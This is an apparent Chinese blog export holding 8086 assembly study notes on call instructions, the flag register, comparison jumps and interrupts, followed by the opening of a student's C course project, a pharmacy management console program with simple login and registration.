<h3 id="1-依据位移进行转移的call指令"><a href="#1-依据位移进行转移的call指令" class="headerlink" title="1.依据位移进行转移的call指令"></a>1.依据位移进行转移的call指令</h3><p>call 标号<br>执行时进行如下操作：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(sp)&#x3D;(sp)-2</span><br><span class="line">((sp)*16+(sp))&#x3D;(ip)</span><br><span class="line">(ip)&#x3D;(ip)+16位位移</span><br></pre></td></tr></table></figure><br>将当前ip压栈后，转到标号处<br>相当于<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push ip</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure></p>
<h3 id="2-转移的目的地址在指令中的call指令"><a href="#2-转移的目的地址在指令中的call指令" class="headerlink" title="2.转移的目的地址在指令中的call指令"></a>2.转移的目的地址在指令中的call指令</h3><p>call far ptr 标号<br>执行时进行如下操作：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(sp)&#x3D;(sp)-2</span><br><span class="line">((ss)*16+(sp))&#x3D;(cs)</span><br><span class="line">(sp)&#x3D;(sp)-2</span><br><span class="line">((sp)*16+(sp))&#x3D;(ip)</span><br></pre></td></tr></table></figure><br>相当于：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push cs</span><br><span class="line">push ip</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure></p>
<h3 id="3-转移地址在寄存器中的call指令"><a href="#3-转移地址在寄存器中的call指令" class="headerlink" title="3.转移地址在寄存器中的call指令"></a>3.转移地址在寄存器中的call指令</h3><p>call 16位寄存器<br>相当于<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push ip</span><br><span class="line">jmp 16位寄存器</span><br></pre></td></tr></table></figure></p>
<h3 id="4-转移地址在内存中的call指令"><a href="#4-转移地址在内存中的call指令" class="headerlink" title="4.转移地址在内存中的call指令"></a>4.转移地址在内存中的call指令</h3><h4 id="4-1-call-word-ptr-内存单元地址"><a href="#4-1-call-word-ptr-内存单元地址" class="headerlink" title="4.1.call word ptr 内存单元地址"></a>4.1.call word ptr 内存单元地址</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push ip</span><br><span class="line">jmp word ptr 内存单元地址</span><br></pre></td></tr></table></figure>
<h4 id="4-2-call-dword-ptr-内存单元地址"><a href="#4-2-call-dword-ptr-内存单元地址" class="headerlink" title="4.2.call dword ptr 内存单元地址"></a>4.2.call dword ptr 内存单元地址</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push cs</span><br><span class="line">push ip</span><br><span class="line">jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure>
<h3 id="call-和-ret配合使用"><a href="#call-和-ret配合使用" class="headerlink" title="call 和 ret配合使用"></a>call 和 ret配合使用</h3><p>实现子程序，用call指令执行子程序，再用ret指令转到call指令后的代码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">标号：</span><br><span class="line">    ....</span><br><span class="line">    指令</span><br><span class="line">    ....</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure></p>
<h2 id="mul指令"><a href="#mul指令" class="headerlink" title="mul指令"></a>mul指令</h2><p>乘法指令</p>
<p>注意：</p>
<ul>
<li>两个相乘的数要么都是8位，要么都是16位<br>&emsp;1.如果是8位，一个默认放在al中，另一个放在8位寄存器或内存字节单元中。结果默认放在ax中<br>&emsp;2.如果是16位，一个默认在ax中，另一个放在16位寄存器或内存字单元中。结果高位默认放在dx中，低位2放在ax中</li>
</ul>
<p>格式：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mul 寄存器&#x2F;内存单元</span><br></pre></td></tr></table></figure><br>如：<br>1.100*10<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov al,100</span><br><span class="line">mov bl,10</span><br><span class="line">mul bl</span><br></pre></td></tr></table></figure><br>结果：(ax)=1000  </p>
<p>2.100*10000<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,100</span><br><span class="line">mov bx,10000</span><br><span class="line">mul bx</span><br></pre></td></tr></table></figure><br>结果：(ax)=4240h&emsp;(dx)=000fh<br>(f4240h=1000000)  </p>
<h2 id="一个公式"><a href="#一个公式" class="headerlink" title="一个公式"></a>一个公式</h2><p>&emsp;将可能产生溢出的除法运算转变为多个不会产生溢出的除法运算(商小于65536)  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x2F;n&#x3D;int (h&#x2F;n)*65536+[ rem(h&#x2F;n)*65536+l]&#x2F;n</span><br></pre></td></tr></table></figure>
<p>x : 被除数(0,ffffffff)<br>n : 除数(0,ffff)<br>h : x高16位<br>l : x低16位<br>int() : 取商<br>rem() : 取余</p>
<h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><p>标志寄存器作用：<br>1.用来储存相关指令的执行结果<br>2.用来为CPU执行相关指令提供行为依据<br>3.用来控制CPU的相关工作方式<br>8086CPU有16位，其中储存的信息被称为程序状态字（psw）<br><strong>flag是按位起作用的，每一位都有专门的含义，记录特定的信息</strong></p>
<p><img src="https://s2.ax1x.com/2020/02/12/1bafdf.png" alt="flag寄存器各位示意图 "></p>
<p>flag的1、3、5、12、13、14、15位在8086CPU中没有使用，其他位都有特殊含义  </p>
<p>影响标志寄存器的大都是运算指令，没有影响的大都是传送指令</p>
<h3 id="ZF标志"><a href="#ZF标志" class="headerlink" title="ZF标志"></a>ZF标志</h3><p>零标志位<br>记录相关指令执行后结果是否为0，如果为0那么ZF=1，如果不为0那么ZF=0<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure><br>执行后zf=1<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,2</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure><br>执行后zf=0</p>
<h3 id="PF标志"><a href="#PF标志" class="headerlink" title="PF标志"></a>PF标志</h3><p>奇偶标志位<br>记录相关指令执行后结果的所有bit位中 1 的个数是否为偶数，如果为偶数PF=1，如果不为偶数PF=0<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov al,1(10)</span><br><span class="line">add al,10(10)</span><br></pre></td></tr></table></figure><br>结果为00001011B，∴PF=0<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">or al,2</span><br></pre></td></tr></table></figure><br>结果为00000011B，∴PF=1</p>
<h3 id="SF标志"><a href="#SF标志" class="headerlink" title="SF标志"></a>SF标志</h3><p>符号标志位<br>记录相关指令执行后结果是否为负，如果负sf=1，如果非负sf=0  </p>
<p>计算机中通常用补码表示有符号数据，一个数据可以看作是 有符号数，也可以看成无符号数。<strong>不管如何看待，CPU在执行指令的时候就已经包含了两种含义，也将得到两种结果，关键在于程序需要哪种结果</strong><br>sf标志是对于有符号数运算的一种记录，记录了数据的正负<br>将数据<strong>当作有符号数运算时，可以通过 sf 知道结果的正负</strong><br>将数据<strong>当作无符号数运算时， sf 值无意义，虽然相关指令影响了它的值</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov al,10000001B</span><br><span class="line">add al,1</span><br></pre></td></tr></table></figure><br>结果为10000010，sf=1，表示：如果指令进行的是有符号数的运算，那么结果为负。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov al,10000001B</span><br><span class="line">add al,01111111B</span><br></pre></td></tr></table></figure><br>结果为0，sf=0，表示如果指令进行的是有符号数运算，那么结果为非负。</p>
<p><strong>单纯地考查sf的值不能知道结果的正负，因为sf记录的只是可以在计算机中存放的相应位数的结果的正负(如果发生溢出)</strong></p>
<h3 id="CF标志"><a href="#CF标志" class="headerlink" title="CF标志"></a>CF标志</h3><p>进位标志位<br>进行<strong>无符号数</strong>运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值  </p>
<p>对于位数为N的无符号数来说，N-1位为它的<em>最高有效位</em>，假想存在的第N位就是相对于最高有效位的更高位</p>
<p>当两个数据相加的时候，可能产生从最高有效位向更高位的进位。CPU不丢弃这个高位进位值，而是保存在CF上</p>
<h3 id="OF标志"><a href="#OF标志" class="headerlink" title="OF标志"></a>OF标志</h3><p>溢出标志位<br>在进行<strong>有符号数</strong>运算时，如果结果超过了机器能表达的范围称为溢出<br>记录了有符号数运算的结果是否发生了溢出，如果发生溢出OF=1，如果没有OF=0</p>
<p><strong>CF是对无符号数运算有意义的标志位，OF是对有符号数运算有意义的标志位。</strong><br><strong>对于无符号数运算，CPU用CF来记录是否产生进位；对于有符号数，CPU用OF来记录是否产生溢出,还要用SF来记录结果的符号</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov al,98</span><br><span class="line">add al,99</span><br></pre></td></tr></table></figure><br>执行后 CF=0，OF=1<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov al,0f0H</span><br><span class="line">add al,78H</span><br></pre></td></tr></table></figure><br>执行后CF=1，OF=0</p>
<h3 id="adc指令"><a href="#adc指令" class="headerlink" title="adc指令"></a>adc指令</h3><p>带进位加法指令，利用了CF位上记录的进位值<br>格式：adc 操作对象1，操作对象2<br>操作对象1=操作对象1+操作对象2+CF<br>比add指令多加了一个CF位的值  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add ax,bx</span><br><span class="line">&#x3D;&#x3D;</span><br><span class="line">add al,bl</span><br><span class="line">adc ah,bh</span><br></pre></td></tr></table></figure>
<p>adc指令执行后也可能产生进位值，所以也会对CF位进行设置<br>add指令和adc指令配合 可以对更大的数据进行加法运算  </p>
<p>例：<br>计算1EF0001000H+2010001EF0H,结果放在ax，bx，cx中</p>
<p>1.将低16位相加，CF中记录相加的进位值<br>2.将次高16位和CF相加，CF中记录相加的进位值<br>3.高16位和CF相加，CF中记录相加的进位值  </p>
<h3 id="sbb指令"><a href="#sbb指令" class="headerlink" title="sbb指令"></a>sbb指令</h3><p>带借位减法指令，利用了CF位上的借位值<br>格式：sbb 操作对象1，操作对象2<br>功能：操作对象1=操作对象1-操作对象2-CF<br>可以对任意大的数据进行减法运算，思路同adc指令</p>
<h3 id="cmp指令"><a href="#cmp指令" class="headerlink" title="cmp指令"></a>cmp指令</h3><p>比较指令，功能相当于减法指令，只是不保存结果，仅仅根据计算结果对标志寄存器进行设置<br>格式：cmp 操作对象1，操作对象2<br>cmp可以对无符号数进行比较，也可以对有符号数进行比较<br>通过cmp指令执行后，相关标志位的值可以看出比较的结果：  </p>
<p>进行无符号数比较时：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmp ax,bx</span><br></pre></td></tr></table></figure>
<p>如果(ax)=(bx)则(ax)-(bx)=0，所以zf=1<br>如果(ax)!=(bx)则(ax)-(bx)!=0，所以zf=0<br>如果(ax)&lt;(bx)则(ax)-(bx)将产生借位，所以cf=1<br>如果(ax)&gt;=(bx)则(ax)-(bx)将不必借位，所以cf=0<br>如果(ax)&gt;(bx)则(ax)-(bx)=0不必借位且结果不为0，所以cf=0，zf=0<br>如果(ax)&lt;=(bx)则(ax)-(bx)=0可能借位，结果可能为0，所以cf=1或zf=1</p>
<p>进行有符号数比较时：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmp ah,bh</span><br></pre></td></tr></table></figure>
<p>如果(ah)=(bh)则(ah)-(bh)=0，所以zf=1<br>如果(ah)!=(bh)则(ah)-(bh)!=0，所以zf=0  </p>
<p>如果sf=1，of=0，(ah)&lt;(bh)<br>如果sf=1，of=1，(ah)&gt;(bh)<br>如果sf=0，of=1，(ah)&lt;(bh)<br>如果sf=0，of=0，(ah)&gt;=(bh)  </p>
<p>of=0，说明没有溢出，逻辑上真正结果的正负=实际结果的正负<br>如果因为溢出导致了实际结果为负(正)，那么逻辑上真正的结果必然为正(负)  </p>
<p><em>zf：记录结果是否为0。如果为0那么ZF=1，如果不为0那么ZF=0   
</em>cf：记录了无符号数运算结果的最高有效位向更高位的进位值<br><em>of：记录了有符号数运算的结果是否发生了溢出，如果发生溢出OF=1，如果没有OF=0。 OF=0,说明逻辑上真正结果的正负=实际结果的正负   
</em>sf： 记录相关指令执行后结果是否为负，如果负sf=1，如果非负sf=0<br>*pf：记录相关指令执行后结果的所有bit位中 1 的个数是否为偶数，如果为偶数PF=1，如果不为偶数PF=0  </p>
<h2 id="检测比较结果的条件转移指令"><a href="#检测比较结果的条件转移指令" class="headerlink" title="检测比较结果的条件转移指令"></a>检测比较结果的条件转移指令</h2><p>与call和ret类似，通常和cmp配合使用<br>检测被cmp影响的，表示比较结果的标志位</p>
<p>根据<strong>无符号数</strong>的比较结果进行转移的条件转移指令检测zf、cf：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">指令            含义                检测标志位</span><br><span class="line">je             等于则转移            zf&#x3D;1      </span><br><span class="line">jne          不等于则转移            zf&#x3D;0                    </span><br><span class="line">jb             低于则转移            cf&#x3D;1</span><br><span class="line">jnb          不低于则转移            cf&#x3D;0                   </span><br><span class="line">ja             高于则转移            cf&#x3D;0&amp;&amp;zf&#x3D;0     </span><br><span class="line">jna          不高于则转移            cf&#x3D;1||zf&#x3D;1</span><br></pre></td></tr></table></figure><br>根据<strong>有符号数</strong>的比较结果进行转移的条件转移指令检测sf、of、zf  </p>
<h2 id="DF标志和串传送指令"><a href="#DF标志和串传送指令" class="headerlink" title="DF标志和串传送指令"></a>DF标志和串传送指令</h2><p>DF：方向标志位，在串传送指令中，控制每次操作后si、di的增减<br>df=0，每次操作后si、di递增<br>df=1，每次操作后si、di递减</p>
<ol>
<li><p>movsb<br>功能：将ds：si指向的内存单元中的<em>字节</em>送入es：di中，然后根据标志寄存器df位的值将si和di递增或递减  </p>
</li>
<li><p>movsw<br>功能：将ds：si指向的内存单元中的<em>字</em>送入es：di中，然后根据标志寄存器df位的值将si和di递增2或递减2  </p>
</li>
</ol>
<p>一般来说，movsb和movsw都和rep配合使用<br>格式： rep movsb<br>功能：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s:movsb</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure></p>
<p>对df位进行设置的指令：<br>cld指令：将df位置0<br>std指令：将df位置1  </p>
<p>使用串传送指令进行数据的传送，需要：</p>
<ol>
<li>传送的原始位置：ds：si</li>
<li>传送的目的位置：es：di</li>
<li>传送的长度：cx</li>
<li>传送的方向：df &emsp;(正向/反向传送，si、di递增/递减)</li>
</ol>
<h3 id="pushf和popf"><a href="#pushf和popf" class="headerlink" title="pushf和popf"></a>pushf和popf</h3><p>pushf是将标志寄存器的值压栈<br>popf是从栈中弹出数据送入标志寄存器中<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,0 ;ax清零</span><br><span class="line">push ax ;ax入栈</span><br><span class="line">popf ;把栈中数据弹出到PSW。至此，PSW已经被全置为: 0000 0000 0000 0000 B</span><br><span class="line"></span><br><span class="line">mov ax,0fff0h</span><br><span class="line">add ax,0010h</span><br><span class="line"></span><br><span class="line">CF：假设这是无符号运算：FFF0h+0010h &#x3D; 1111 1111 1111 0000b + 0000 0000 0001 0000b</span><br><span class="line">&#x3D;(进位1)0000 0000 0000 0000b，产生进位1，CF标志 &#x3D; 1。</span><br><span class="line"></span><br><span class="line">OF：假设这是有符号运算：FFF0h此处为补码形式，(FFF0h)原 &#x3D; 1000 0000 0001 0000b。FFF0h+0010h&#x3D;0，OF标志 &#x3D; 0</span><br><span class="line"></span><br><span class="line">pushf</span><br><span class="line">pop ax</span><br><span class="line">这两句把 ax的值设置为：(0000 00** 010* 0101)b</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure><br><em>tips</em>:</p>
<p>  <strong>正加正得负，或负加负得正，肯定溢出</strong></p>
<p>   <strong>一个正数和一个负数相加不可能溢出</strong></p>
<h2 id="内中断"><a href="#内中断" class="headerlink" title="内中断"></a>内中断</h2><p>任何一个cpu都可以在执行完当前正在执行的指令后，检测到从cpu外部发送来的或内部产生的一种特殊信息，并且可以立即对所接收到的信息进行处理，这种信息称为<strong>中断信息</strong>。  </p>
<h3 id="内中断的产生"><a href="#内中断的产生" class="headerlink" title="内中断的产生"></a>内中断的产生</h3><p>cpu内部有4种情况可以产生需要及时处理的中断信息<br>处理中断信息首先要知道接收到的信息的来源，所以中断信息中必须包含识别来源的编码。8086cpu用中断类型码来标识中断信息的来源<br>中断类型码为一个字节型数据，即可以表示256种中断信息的来源（简称中断源）</p>
<ol>
<li>除法错误，如执行div指令产生的除法溢出&emsp;中断类型码：0</li>
<li>单步执行&emsp;中断类型码：1</li>
<li>执行into指令&emsp;中断类型码：4</li>
<li>执行int 指令&emsp;指令格式为int n,n为字节型立即数,中断类型码：n</li>
</ol>
<h3 id="中断向量表"><a href="#中断向量表" class="headerlink" title="中断向量表"></a>中断向量表</h3><p>中断处理程序入口地址的列表<br>cpu用8位的终端类型码，通过中断向量表，找到相应的中断处理程序的入口地址<br>中断向量表在内存中保存，其中存放着256个中断源所对应的中断处理程序的入口<br>cpu知道了中断类型码就可以将中断类型码作为中断向量表的表项号，定位相应的表项，从而得到程序的入口地址<br>如果使用8086cpu，中断向量表就必须存放在0000：0000~0000：03FF中，一个表项占两个字，高地址存放段地址，低地址字存放偏移地址</p>
<h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p><em>一个字节：8位
</em>一个字==两个字节</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>课设-药店管理系统</title>
    <url>/13498.html</url>
    <content><![CDATA[<p>（为了避免又发生某种奇怪的错误导致程序突然变成了前几个小时保存的版本，还是做完后把它弄到这来好了）<br>一个功能简单的管理系统，包含了menu()里的功能以及登录、注册和称不上加密的加密  </p>
<p>尝试使用了system(“pause”)、system(“cls”)以及把黑框弄成白框的system(“color 70”)<br><a id="more"></a><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">用于测试数据： </span></span><br><span class="line"><span class="comment">1234 哇 123 处 2000 2029 10</span></span><br><span class="line"><span class="comment">2344 吃 232 非 1234 2099 1</span></span><br><span class="line"><span class="comment">1233 啊 1234 非 2019 2020 2</span></span><br><span class="line"><span class="comment">1239 非 129 处 2001 2021 13</span></span><br><span class="line"><span class="comment">1342 哦哦、 23 处 2011 2022 13</span></span><br><span class="line"><span class="comment">3244 ·· 243 非 2011 2021 2 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">med</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> elecode;<span class="comment">//编码</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">10</span>];<span class="comment">// 药品名称</span></span><br><span class="line">	<span class="keyword">double</span> price;<span class="comment">//价格</span></span><br><span class="line">	<span class="keyword">char</span> type[<span class="number">5</span>];<span class="comment">// 药品类型</span></span><br><span class="line">	<span class="keyword">int</span> prod;<span class="comment">//生产日期(年)</span></span><br><span class="line">	<span class="keyword">int</span> shelf;<span class="comment">//保质期(年)</span></span><br><span class="line">	<span class="keyword">int</span> stock;<span class="comment">//库存</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">med</span>* <span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">med</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"欢迎使用本管理系统\n"</span> </span><br><span class="line">			<span class="string">"选择一项功能:\n"</span></span><br><span class="line">	       <span class="string">"1.录入信息\n"</span></span><br><span class="line">	       <span class="string">"2.打印信息\n"</span></span><br><span class="line">	       <span class="string">"3.保存信息\n"</span></span><br><span class="line">	       <span class="string">"4.读取信息\n"</span></span><br><span class="line">	       <span class="string">"5.统计药品总数\n"</span></span><br><span class="line">	       <span class="string">"6.查找符合条件的药品\n"</span></span><br><span class="line">	       <span class="string">"7.修改信息\n"</span></span><br><span class="line">	       <span class="string">"8.删除信息\n"</span></span><br><span class="line">	       <span class="string">"9.退出\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">user</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	system(<span class="string">"color 70"</span>);</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(user()!=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">		<span class="keyword">switch</span>(n) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//录入</span></span><br><span class="line">				build();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//打印</span></span><br><span class="line">				<span class="built_in">print</span>(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//保存</span></span><br><span class="line">				save(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:<span class="comment">//读取</span></span><br><span class="line">				<span class="built_in">read</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:<span class="comment">//统计人数</span></span><br><span class="line">				sum(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span>:<span class="comment">//查找</span></span><br><span class="line">				<span class="built_in">find</span>(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">7</span>:<span class="comment">//修改</span></span><br><span class="line">				modify(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">8</span>:<span class="comment">//删除</span></span><br><span class="line">				<span class="built_in">remove</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"Wrong num\n"</span>);</span><br><span class="line">				getchar();</span><br><span class="line">				getchar();</span><br><span class="line">				system(<span class="string">"cls"</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"欢迎使用本系统，请先注册或登录：\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1.注册/2.登录："</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">	<span class="keyword">char</span> id[<span class="number">10</span>],pass[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"输入:用户名  密码:  (均只能为小于8位的字母或数字)"</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s %s"</span>,id,pass);</span><br><span class="line">		FILE* fp;</span><br><span class="line">		fp = fopen(<span class="string">".\\userinfo.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; id[i]!=<span class="string">'\0'</span>; i++) &#123;</span><br><span class="line">			id[i]+=<span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; pass[i]!=<span class="string">'\0'</span>; i++) &#123;</span><br><span class="line">			pass[i]+=<span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">"%s "</span>,id);</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">"%s "</span>,pass);</span><br><span class="line">		fclose(fp);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"保存成功\n"</span>);</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line">		system(<span class="string">"cls"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">2</span>) &#123;</span><br><span class="line">		FILE *fp;</span><br><span class="line">		fp=fopen(<span class="string">".\\userinfo.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">		<span class="keyword">if</span>(fp==<span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"还未注册过"</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"输入用户名: "</span>);</span><br><span class="line">			<span class="keyword">char</span> a[<span class="number">10</span>],b[<span class="number">10</span>];</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; a[i]!=<span class="string">'\0'</span>; i++) &#123;</span><br><span class="line">				a[i]+=<span class="number">2</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"输入密码："</span>);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> g=<span class="number">0</span>; g&lt;<span class="number">10</span>; g++) &#123;</span><br><span class="line">				b[g]=getch();</span><br><span class="line">				<span class="keyword">if</span> (b[g]==<span class="string">'\x0d'</span>) &#123;</span><br><span class="line">					b[g]=<span class="string">'\0'</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				b[g]=b[g]+<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"*"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,id)==<span class="number">1</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">strcmp</span>(id,a)==<span class="number">0</span>) &#123;</span><br><span class="line">					<span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,pass);</span><br><span class="line">					<span class="keyword">if</span>(<span class="built_in">strcmp</span>(pass,b)==<span class="number">0</span>) &#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">"正在进入管理系统...."</span>);</span><br><span class="line">						system(<span class="string">"pause"</span>);</span><br><span class="line">						system(<span class="string">"cls"</span>);</span><br><span class="line">						<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"用户名或密码错误"</span>);</span><br><span class="line">			system(<span class="string">"pause"</span>);</span><br><span class="line">			system(<span class="string">"cls"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">med</span> *<span class="title">head</span>=<span class="title">NULL</span>,*<span class="title">nextp</span>;</span></span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">		head=p;</span><br><span class="line">		<span class="keyword">while</span>(head-&gt;next!=<span 